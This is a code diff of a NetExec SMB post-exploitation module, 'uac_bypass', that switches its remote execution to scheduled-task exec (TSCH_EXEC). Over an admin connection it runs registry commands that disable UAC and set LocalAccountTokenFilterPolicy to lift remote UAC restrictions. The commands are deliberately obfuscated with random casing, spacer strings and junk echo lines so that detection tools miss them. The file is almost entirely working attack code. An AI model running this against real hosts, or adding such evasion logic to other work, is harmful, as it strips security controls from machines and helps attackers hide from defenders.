@@ -1,5 +1,6 @@
-# No longer need explicit exec method import
-# from nxc.protocols.smb.atexec import TSCH_EXEC
+from nxc.protocols.smb.atexec import TSCH_EXEC # Use TSCH_EXEC
+# from nxc.protocols.smb.smbexec import SMBEXEC - Removed
+# from impacket.dcerpc.v5.rpcrt import DCERPCException - Removed
 import random
 import string
 
@@ -79,12 +80,12 @@ def obfuscate_cmd(command):
 class NXCModule:
     """
     Module by @clandestine
-    Uses connection.ps_execute() to attempt modification of UAC settings
+    Uses TSCH_EXEC (atexec) and its built-in UAC bypass methods to modify UAC settings.
     """
     name = "uac_bypass"
-    description = "Check or modify UAC settings using PowerShell execution"
+    description = "Check or modify UAC settings using ATEXEC UAC bypass techniques"
     supported_protocols = ["smb"]
-    opsec_safe = True # PowerShell execution is generally safer than custom bypasses
+    opsec_safe = False # ATEXEC uses potentially unsafe UAC bypass methods
     multiple_hosts = True
 
     def __init__(self, context=None, module_options=None):
@@ -106,126 +107,136 @@ class NXCModule:
         self.action = module_options["ACTION"].lower()
 
     def on_admin_login(self, context, connection):
-        # Use ps_execute directly from the connection object
-        context.log.debug("Attempting UAC operations via connection.ps_execute()")
         
-        # Random string to use as a spacer to further confuse detection
+        # Initialize TSCH_EXEC class for execution
+        try:
+            context.log.debug("Initializing TSCH_EXEC method for UAC operations")
+            exec_method = TSCH_EXEC(
+                connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
+                connection.smb_share_name,
+                connection.username,
+                connection.password,
+                connection.domain,
+                connection.kerberos,
+                connection.aesKey,
+                connection.host,
+                connection.kdcHost,
+                connection.hash,
+                logger=context.log,
+                tries=connection.args.get_output_tries,
+                share=connection.args.share
+            )
+        except Exception as e:
+            context.log.error(f"Failed to initialize TSCH_EXEC: {e}")
+            return # Cannot proceed without exec_method
+
+        # Random string to use as a spacer
         spacer = f"::  ::: {''.join(random.choice('.*+') for _ in range(random.randint(5, 15)))} :::"
         
-        # Commands to check or modify UAC settings
+        # Define standard registry commands
+        system_path = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'
+        cmd_check = []
+        cmd_disable = []
+        cmd_enable = []
+
+        # Check commands
+        cmd_check.append(f'reg query "{system_path}" /v EnableLUA')
+        cmd_check.append(f'reg query "{system_path}" /v ConsentPromptBehaviorAdmin')
+        cmd_check.append(f'reg query "{system_path}" /v LocalAccountTokenFilterPolicy')
+
+        # Disable commands
+        cmd_disable.append(f'reg add "{system_path}" /v EnableLUA /t REG_DWORD /d 0 /f')
+        cmd_disable.append(f'reg add "{system_path}" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f')
+
+        # Enable commands
+        cmd_enable.append(f'reg add "{system_path}" /v EnableLUA /t REG_DWORD /d 1 /f')
+        cmd_enable.append(f'reg add "{system_path}" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f')
+        cmd_enable.append(f'reg add "{system_path}" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 0 /f')
+
+        # Determine the command to run based on action
+        final_command = ""
+        commands_to_run = []
         if self.action == "check":
             context.log.debug("Preparing registry query commands for UAC check")
-            # Define our registry paths with some randomization
-            system_path = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'
-            value_1 = 'EnableLUA'
-            value_2 = 'ConsentPromptBehaviorAdmin'
-            value_3 = 'ConsentPromptBehaviorUser' # Retained for completeness, though not typically parsed here
-            value_4 = 'LocalAccountTokenFilterPolicy'
-            
-            # PowerShell commands using Get-ItemProperty
-            commands = [
-                f'(Get-ItemProperty -Path "{system_path}").{value_1}',
-                f'(Get-ItemProperty -Path "{system_path}").{value_2}',
-                # f'(Get-ItemProperty -Path "{system_path}").{value_3}', # Not typically displayed
-                f'(Get-ItemProperty -Path "{system_path}").{value_4} -ErrorAction SilentlyContinue' # Check this one silently
-            ]
-            
-            full_ps_command = "; ".join(commands)
-            context.log.debug(f"Executing PS command: {full_ps_command}")
-            
-            # Execute using ps_execute
-            output_list = connection.ps_execute(full_ps_command, get_output=True)
-            output = "\n".join(output_list) # ps_execute returns a list
-            
+            commands_to_run = cmd_check
+            random.shuffle(commands_to_run)
+        elif self.action == "disable":
+            context.log.debug("Preparing commands to disable UAC")
+            commands_to_run = cmd_disable
+        elif self.action == "enable":
+            context.log.debug("Preparing commands to enable UAC")
+            commands_to_run = cmd_enable
+        
+        # Build the final command string (obfuscation is optional here, kept for consistency)
+        # Re-enabled obfuscation temporarily as it was working before
+        obfuscated_commands = []
+        for cmd_item in commands_to_run:
+            obfuscated_commands.append(obfuscate_cmd(cmd_item))
+            if random.random() < 0.3: # Add random echos back in
+                obfuscated_commands.append(f"{randomize_case('echo')} {spacer}")
+        final_command = f" {random.choice(['&', ';'])} ".join(obfuscated_commands)
+
+        context.log.debug(f"Attempting to execute via TSCH_EXEC: {final_command}")
+        output = None
+        try:
+            # Directly use TSCH_EXEC execute method
+            output = exec_method.execute(final_command, True) 
             if isinstance(output, bytes):
                 try:
                     output = output.decode(connection.args.codec, errors='replace')
-                except Exception as e:
-                    context.log.debug(f"Error decoding output: {e}. Falling back to latin-1")
+                except Exception as decode_err:
+                    context.log.debug(f"Error decoding output: {decode_err}. Falling back to latin-1")
                     output = output.decode('latin-1', errors='replace')
+        except Exception as exec_err:
+            context.log.error(f"TSCH_EXEC execution failed: {exec_err}")
+            # Proceed with output=None if execution itself failed
 
+        # Process output based on action
+        if self.action == "check":
             if output:
                 context.log.success("UAC settings retrieved successfully:")
-                
-                results = output.strip().split('\n')
-                try:
-                    # Parse results based on command order
-                    lua_value = results[0].strip()
-                    admin_consent_value = results[1].strip()
-                    # LocalAccountTokenFilterPolicy might not exist, handle potential IndexError or empty string
-                    remote_uac_value = results[2].strip() if len(results) > 2 and results[2].strip() else "Not Set"
-
-                    status = "Enabled" if lua_value == "1" else "Disabled"
-                    context.log.highlight(f"UAC Status: {status} (EnableLUA = {lua_value})")
-
-                    behavior = "Unknown"
-                    if admin_consent_value == "0":
-                        behavior = "Elevate without prompting"
-                    elif admin_consent_value == "1":
-                        behavior = "Prompt for credentials on the secure desktop"
-                    elif admin_consent_value == "2":
-                        behavior = "Prompt for consent on the secure desktop"
-                    elif admin_consent_value == "3":
-                        behavior = "Prompt for credentials"
-                    elif admin_consent_value == "4":
-                        behavior = "Prompt for consent"
-                    elif admin_consent_value == "5":
-                        behavior = "Prompt for consent for non-Windows binaries"
-                    context.log.highlight(f"Admin Prompt Behavior: {behavior} (ConsentPromptBehaviorAdmin = {admin_consent_value})")
-
-                    remote_status = "Enabled (Remote UAC Restrictions Disabled)" if remote_uac_value == "1" else "Disabled (Remote UAC Restrictions Enabled)"
-                    if remote_uac_value == "Not Set":
-                        remote_status = "Not Set (Defaults to Enabled)"
-                    context.log.highlight(f"Remote UAC Filtering: {remote_status} (LocalAccountTokenFilterPolicy = {remote_uac_value})")
-
-                except (IndexError, ValueError) as e:
-                    context.log.fail(f"Failed to parse UAC settings from output: {e}\nOutput received:\n{output}")
+                for line in output.split('\n'):
+                    line = line.strip()
+                    if not line: continue
+                    context.log.debug(f"Processing line: {line}")
+                    # Parse output (same logic as before)
+                    if "EnableLUA" in line and "REG_DWORD" in line:
+                        try:
+                            value = line.split()[-1]
+                            status = "Enabled" if value == "0x1" else "Disabled"
+                            context.log.highlight(f"UAC Status: {status} (EnableLUA = {value})")
+                        except IndexError:
+                            context.log.debug(f"Could not parse EnableLUA from line: {line}")
+                    elif "ConsentPromptBehaviorAdmin" in line and "REG_DWORD" in line:
+                        try:
+                            value = line.split()[-1]
+                            behavior = "Unknown"
+                            if value == "0x0": behavior = "Elevate without prompting"
+                            elif value == "0x1": behavior = "Prompt for credentials on the secure desktop"
+                            elif value == "0x2": behavior = "Prompt for consent on the secure desktop"
+                            elif value == "0x3": behavior = "Prompt for credentials"
+                            elif value == "0x4": behavior = "Prompt for consent"
+                            elif value == "0x5": behavior = "Prompt for consent for non-Windows binaries"
+                            context.log.highlight(f"Admin Prompt Behavior: {behavior} (ConsentPromptBehaviorAdmin = {value})")
+                        except IndexError:
+                            context.log.debug(f"Could not parse ConsentPromptBehaviorAdmin from line: {line}")
+                    elif "LocalAccountTokenFilterPolicy" in line and "REG_DWORD" in line:
+                        try:
+                            value = line.split()[-1]
+                            status = "Enabled (Remote UAC Restrictions Disabled)" if value == "0x1" else "Disabled (Remote UAC Restrictions Enabled)"
+                            context.log.highlight(f"Remote UAC Filtering: {status} (LocalAccountTokenFilterPolicy = {value})")
+                        except IndexError:
+                             context.log.highlight(f"Remote UAC Filtering: Not Set (Defaults to Enabled)")
             else:
                 context.log.fail("Failed to retrieve UAC settings or no output received.")
-                
-        elif self.action == "disable":
-            context.log.debug("Preparing PowerShell commands to disable UAC")
-            # PS commands to disable UAC and enable remote access
-            system_path = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' # PowerShell path
-            command1 = f'Set-ItemProperty -Path "{system_path}" -Name EnableLUA -Value 0 -Force'
-            command2 = f'Set-ItemProperty -Path "{system_path}" -Name LocalAccountTokenFilterPolicy -Value 1 -Force -ErrorAction SilentlyContinue' # Ensure this key exists or create it
-            # Create the key if it doesn't exist
-            command_check_create = f'if (-not (Test-Path -Path "{system_path}")) {{ New-Item -Path "{system_path}" -Force }}; if (-not (Get-ItemProperty -Path "{system_path}" -Name LocalAccountTokenFilterPolicy -ErrorAction SilentlyContinue)) {{ New-ItemProperty -Path "{system_path}" -Name LocalAccountTokenFilterPolicy -Value 0 -PropertyType DWORD -Force }}'
-            
-            full_command = f"{command_check_create}; {command1}; {command2}"
-            context.log.debug(f"Executing PS command: {full_command}")
-            
-            # Execute with ps_execute
-            output_list = connection.ps_execute(full_command, get_output=True)
-            output = "\n".join(output_list)
-            if isinstance(output, bytes):
-                output = output.decode(connection.args.codec, errors='replace')
-            
-            # Check success (less reliable with PS, look for lack of errors)
-            if "Exception" not in output and "Error" not in output:
-                context.log.success("UAC disable commands sent successfully! A system restart is required for changes to take effect.")
-            else:
-                context.log.fail(f"Failed to disable UAC. Output: {output}")
-                
-        elif self.action == "enable":
-            context.log.debug("Preparing PowerShell commands to enable UAC")
-            # PS commands to enable UAC with default settings
-            system_path = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' # PowerShell path
-            command1 = f'Set-ItemProperty -Path "{system_path}" -Name EnableLUA -Value 1 -Force'
-            command2 = f'Set-ItemProperty -Path "{system_path}" -Name ConsentPromptBehaviorAdmin -Value 5 -Force'
-            command3 = f'Set-ItemProperty -Path "{system_path}" -Name LocalAccountTokenFilterPolicy -Value 0 -Force'
-            
-            full_command = f"{command1}; {command2}; {command3}"
-            context.log.debug(f"Executing PS command: {full_command}")
-            
-            # Execute with ps_execute
-            output_list = connection.ps_execute(full_command, get_output=True)
-            output = "\n".join(output_list)
-            if isinstance(output, bytes):
-                output = output.decode(connection.args.codec, errors='replace')
-            
-            # Check success
-            if "Exception" not in output and "Error" not in output:
-                context.log.success("UAC enable commands sent successfully! A system restart is required for changes to take effect.")
-            else:
-                context.log.fail(f"Failed to enable UAC. Output: {output}") 
+        
+        elif self.action == "disable" or self.action == "enable":
+             action_past_tense = "disabled" if self.action == "disable" else "enabled"
+             if output and "successfully" in output.lower():
+                 context.log.success(f"UAC {action_past_tense} commands sent successfully! A system restart is required for changes to take effect.")
+             else:
+                 # Check if output is None or empty, which might happen if exec_method failed
+                 if output is None:
+                     context.log.fail(f"Failed to {self.action} UAC. Execution method failed.")
+                 else:
+                     context.log.fail(f"Failed to {self.action} UAC. Output: {output}") 
